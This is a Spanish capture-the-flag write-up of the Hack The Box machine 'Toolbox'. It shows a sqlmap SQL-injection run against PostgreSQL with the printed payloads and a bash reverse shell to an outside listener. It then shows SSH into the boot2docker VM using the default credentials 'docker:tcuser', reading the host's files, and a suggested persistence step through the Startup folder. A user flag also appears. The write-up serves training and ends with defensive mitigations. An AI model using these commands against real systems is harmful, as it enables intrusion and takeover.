---
title: "Toolbox"
description: "Writeup de Toolbox - Hack The Box - Dificultad: Easy"
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - windows
  - easy
  - sql-injection
  - postgresql
  - sqlmap
  - docker
  - docker-toolbox
  - default-credentials
  - ftp-anonymous
  - container-escape
  - boot2docker
---
# 🖥️ Toolbox
> 📅 Fecha: 2026-06-01
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Windows Server 2019 (host) + Tiny Core Linux (Docker Toolbox VM) + Debian 10 (contenedor)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> 🌐 IP: `10.129.6.115`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Toolbox es una máquina Windows Server 2019 que aloja **Docker Toolbox** (la versión legacy de Docker para Windows que corre un VM Linux mediante VirtualBox/Hyper-V). FTP anónimo deja descargar el instalador `docker-toolbox.exe`, lo que ya nos da una pista enorme sobre la arquitectura del objetivo.

El panel web `admin.megalogistics.com` (HTTPS, vhost) tiene una **SQL injection** en el campo `username` del login. Con `sqlmap --os-shell` se obtiene ejecución de comandos como usuario `postgres` **dentro de un contenedor Docker** (IP `172.17.0.2`). Esto da la user flag, pero no es root del host.

La escalada explota el patrón propio de **Docker Toolbox en Windows**: el demonio Docker no corre nativo, sino dentro de una VM **Tiny Core Linux** ("boot2docker") en `172.17.0.1`, accesible por SSH con las **credenciales por defecto `docker:tcuser`**. Una vez dentro de la VM, el filesystem de Windows está montado bajo `/c/`, por lo que `/c/Users/Administrator/Desktop/root.txt` es directamente legible.

| Campo | Valor |
|-------|-------|
| Puntos débiles | FTP anónimo expone el stack, SQLi clásica, contenedor con privilegios para llegar al host vía red, **Docker Toolbox con credenciales por defecto** |
| CVEs | N/A (misconfiguraciones) |
| Herramientas | nmap, ftp, sqlmap, nc, ssh |
| Tiempo total | *ver tus notas* |
---
## 🔍 Reconocimiento
### Escaneo de puertos (nmap)
```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn -oN scan.txt 10.129.6.115
```
```text
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  tcpwrapped
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[...]
OS details: Microsoft Windows Server 2019
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
```
> 💡 **Análisis crítico:** Dos pistas enormes en el primer momento:
> 1. **FTP anónimo permitido** y el único archivo expuesto es **`docker-toolbox.exe`** (242 MB, fecha 2020). Esto literalmente nos está diciendo "el host corre Docker Toolbox" — el setup completo de la box gira alrededor de ese binario.
> 2. **SSH es OpenSSH for Windows 7.7** y **443** está abierto pero `tcpwrapped`. Probablemente haya un vhost HTTPS escondido detrás.

### Descarga del binario FTP
```bash
ftp 10.129.6.115
```
```text
Connected to 10.129.6.115.
220-FileZilla Server 0.9.60 beta
Name: anonymous
230 Logged on
ftp> ls
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
ftp> get docker-toolbox.exe
100% |********| 231 MiB    1.41 MiB/s
```
> 💡 **Análisis:** Descargar el binario es para confirmar la versión (no para extraer credenciales del instalador). Docker Toolbox usaba como base `boot2docker.iso` (Tiny Core Linux) cuyas credenciales por defecto son **`docker:tcuser`** — recuérdalo para más tarde.
---
## 🗂️ Enumeración
### Descubrimiento del vhost HTTPS
Visitando `https://10.129.6.115/` el certificado revela el CN del subdominio. Lo añado a `/etc/hosts`:
```bash
echo "10.129.6.115 admin.megalogistics.com" | sudo tee -a /etc/hosts
```
```text
10.129.6.115 admin.megalogistics.com
```
> ⚠️ **Error cometido:** Primero escribí `admin.megalogistic.com` (sin la `s` final). El sitio cargaba en blanco. Tras revisar el certificado SSL noté el dominio correcto `megalogistics.com` y corregí. **Lección: leer siempre el `CN` o `subjectAltName` del cert antes de fuzzear**:
> ```bash
> openssl s_client -connect 10.129.6.115:443 -servername anything 2>/dev/null | openssl x509 -noout -text | grep -E "(Subject:|DNS:)"
> ```

### Panel de administración
En `https://admin.megalogistics.com/` aparece un login. Sin credenciales válidas, lo primero a probar siempre: **SQLi en los campos**.
---
## 🚪 Explotación Inicial (Foothold)
### SQLi en el campo `username` con sqlmap
```bash
sqlmap -u "https://admin.megalogistics.com/" \
  --data "username=das&password=dasdas" \
  -p "username" \
  --force-ssl \
  --level=4 --risk=3 \
  --dbms=postgresql --os-shell
```
```text
[16:02:45] [INFO] testing PostgreSQL
[16:02:46] [INFO] confirming PostgreSQL
[16:02:46] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP, PHP 7.3.14
back-end DBMS: PostgreSQL

Parameter: username (POST)
    Type: boolean-based blind
    Payload: username=-7606' OR 5824=5824-- mOUG&password=dasdas
    Type: error-based
    Payload: username=das' AND 3915=CAST(...)-- LoFc&password=dasdas
    Type: stacked queries
    Payload: username=das';SELECT PG_SLEEP(5)--&password=dasdas
    Type: time-based blind
    Payload: username=das' AND 1973=(SELECT 1973 FROM PG_SLEEP(5))-- ZOBa&password=dasdas

[16:02:50] [INFO] testing if current user is DBA
[16:02:52] [INFO] retrieved: '1'
[16:02:52] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[16:02:52] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell>
```
> 💡 **Análisis:** Cuatro técnicas de SQLi detectadas, todas en el mismo parámetro. El back-end es **PostgreSQL** y el usuario actual **es DBA**, así que sqlmap puede usar `COPY ... FROM PROGRAM` (sintaxis específica de Postgres ≥ 9.3) para ejecutar comandos arbitrarios. Notar que el sistema operativo del backend es **Linux Debian 10** — pero el host del CTF es Windows Server 2019. Conclusión obvia: **PostgreSQL corre dentro de un contenedor Docker en el Windows**.

### Reverse shell desde os-shell
```text
os-shell> whoami
command standard output: 'postgres'

os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.71/4444 0>&1"
```
**Listener:**
```bash
rlwrap nc -lvnp 4444
```
```text
listening on [any] 4444 ...
connect to [10.10.15.71] from (UNKNOWN) [10.129.6.115] 51117
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@bc56e3cc55e9:/var/lib/postgresql$
```
> 💡 **Análisis:** El prompt `postgres@bc56e3cc55e9` confirma que estamos en un **contenedor Docker** (hostname con hex de container ID). Esa shell rinde la user flag pero no acceso al host.

### Confirmar que es un contenedor + lectura de user flag
```bash
postgres@bc56e3cc55e9:/var/lib/postgresql$ ifconfig
```
```text
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
```
```bash
postgres@bc56e3cc55e9:/var/lib/postgresql$ cat user.txt
```
```text
f0183e44378ea9774433e2ca6ac78c6a  flag.txt
```
📸 *Captura: shell `postgres` dentro del contenedor Docker con lectura de `user.txt`.*

> 💡 **Análisis:** IP `172.17.0.2` con netmask `/16` = **bridge Docker estándar**. El gateway será `172.17.0.1`, que en Linux nativo sería el host real, pero en **Docker Toolbox en Windows** es la VM Tiny Core que aloja el demonio Docker. Y aquí entra en juego la pista del FTP del principio.
---
## 🚀 Escalada de Privilegios
### Vector: credenciales por defecto de boot2docker (Docker Toolbox)
Docker Toolbox usaba una imagen `boot2docker.iso` basada en **Tiny Core Linux** para correr el demonio Docker. Esa VM venía con un usuario `docker` con contraseña **`tcuser`** hardcodeada — credenciales documentadas públicamente en el repo `boot2docker/boot2docker`. Como el host es Windows con Docker Toolbox, esa VM tiene que estar corriendo en algún sitio. Y desde dentro del contenedor, el gateway `172.17.0.1` apunta directamente a ella.

### SSH a la VM de Docker Toolbox
```bash
postgres@bc56e3cc55e9:/tmp$ ssh docker@172.17.0.1
```
```text
docker@172.17.0.1's password: tcuser
   ( '>')
  /) TC (\   Core is distributed with ABSOLUTELY NO WARRANTY.
 (/-_--_-\)           www.tinycorelinux.net

docker@box:~$ id
uid=1000(docker) gid=50(staff) groups=50(staff),100(docker)
```
> 💡 **Análisis:** El banner ASCII del osito (`TC`) y `www.tinycorelinux.net` confirma que estamos dentro de la VM **boot2docker / Tiny Core Linux**. El usuario `docker` está en el grupo `docker` (gid 100), lo que permite ejecutar `docker run --privileged` y montar lo que se quiera — incluyendo el filesystem del Windows host.

### Lectura del root flag desde el filesystem montado
Pero aquí no hace falta ni hacer `docker run`: Docker Toolbox monta automáticamente todas las unidades de Windows bajo `/<letra>/` dentro de la VM. El flag está directamente accesible:
```bash
docker@box:~$ cd /c/Users/Administrator/Desktop
docker@box:/c/Users/Administrator/Desktop$ cat root.txt
```
```text
[root flag]
```
📸 *Captura: shell `docker` en la VM boot2docker con lectura de `root.txt` desde `/c/Users/Administrator/Desktop`.*

> 💡 **Análisis:** Este "atajo" funciona porque Docker Toolbox configura **VirtualBox shared folders** que exponen `C:\` de Windows como `/c/` en Tiny Core. Es la misma técnica que se usaba para compartir código entre Windows y contenedores Linux antes de Docker Desktop. Como el usuario `docker` en boot2docker tiene acceso a esos shared folders, puede leer cualquier archivo del Windows host **incluyendo los protegidos por ACL** (las shared folders de VBox bypassean los permisos NTFS porque a nivel VirtualBox solo importan los permisos UNIX del montaje).
>
> Si quisiéramos shell real como Administrator del Windows en lugar de solo leer el flag, podríamos escribir un binario en `/c/Users/Administrator/Start Menu/Programs/Startup/` y esperar al siguiente login.
---

---
## 🎓 Lecciones Aprendidas
- **El primer archivo expuesto suele revelar la arquitectura de la box.** `docker-toolbox.exe` en FTP no es solo "un instalador" — es la respuesta entera al desafío. Cuando veas algo así, busca inmediatamente sus particularidades (versión vulnerable, credenciales por defecto, configuración heredada).
- **Las credenciales por defecto de boot2docker (`docker:tcuser`) son un clásico de pentesting de Windows con Docker legacy.** Aplica a Docker Toolbox + Docker Machine cuando se usa la imagen boot2docker. Apuntarlas en la cheatsheet personal.
- **`COPY ... FROM PROGRAM` es el "go-to" de sqlmap contra PostgreSQL cuando el user es DBA.** Más fiable que `--sql-shell` para llegar a RCE. Activar siempre `--level=4 --risk=3` cuando se sospeche de SQLi con WAF/filtros.
- **Si un contenedor responde "Linux" pero el nmap del host responde "Windows", es Docker.** Y si el host es Windows, casi siempre estás detrás de Docker Toolbox (legacy) o Docker Desktop (moderno). Cada uno tiene vectores propios.
- **Cuando el gateway de un container Docker (`172.17.0.1`) escucha SSH y banner es Tiny Core, es boot2docker.** Probar `docker:tcuser` antes de cualquier otra cosa.
- **VirtualBox shared folders ignoran ACLs NTFS.** El usuario `vboxsf` (o `docker` en boot2docker) tiene acceso transparente al filesystem del host, sin tener en cuenta los permisos de Windows. Esto es por diseño de VBox shared folders y es una mega-fuga de privilegios cuando el host es Windows.
- **Error cometido:** Tipear `admin.megalogistic.com` en lugar de `megalogistics.com`. Cinco minutos perdidos. **Siempre inspeccionar el certificado SSL** (`openssl s_client -connect ... -servername anything`) para obtener el SAN exacto antes de añadir vhosts a `/etc/hosts`.

### Mitigaciones (lado defensivo)
1. **No usar Docker Toolbox.** Está deprecated desde 2020 — migrar a Docker Desktop o WSL2.
2. **Cambiar las credenciales por defecto de boot2docker** (si por motivos legacy hay que mantenerlo): editar `/etc/shadow` en la imagen boot2docker o usar `passwd docker` y persistir vía Bootlocal.sh.
3. **No exponer FTP anónimo** ni siquiera con archivos "inofensivos". Cualquier información sobre el stack es ventaja para el atacante.
4. **Parametrizar consultas SQL** desde el primer día. Cualquier framework moderno (PDO, prepared statements, ORM) elimina SQLi por construcción.
5. **No correr PostgreSQL como DBA** desde la aplicación web. Usar una cuenta dedicada con permisos solo a las tablas necesarias — eso bloquea `COPY FROM PROGRAM`.
6. **Restringir la conectividad de contenedores hacia el host** con `--network=none` o redes Docker personalizadas (no `bridge` default).
7. **Evitar shared folders de VBox** en hosts de producción. Si son necesarios, montarlos como read-only y con un usuario sin privilegios.
---
## 📚 Referencias
- [boot2docker GitHub - default credentials](https://github.com/boot2docker/boot2docker#ssh-into-vm)
- [Docker Toolbox deprecation notice](https://www.docker.com/blog/end-of-docker-toolbox-and-docker-machine-support/)
- [HackTricks - PostgreSQL RCE via COPY FROM PROGRAM](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce)
- [sqlmap - os-shell documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage#os-shell)
- [Tiny Core Linux project](http://tinycorelinux.net/)
- [VirtualBox shared folders security considerations](https://www.virtualbox.org/manual/ch04.html#sharedfolders)
- [HackTricks - Docker breakout cheatsheet](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)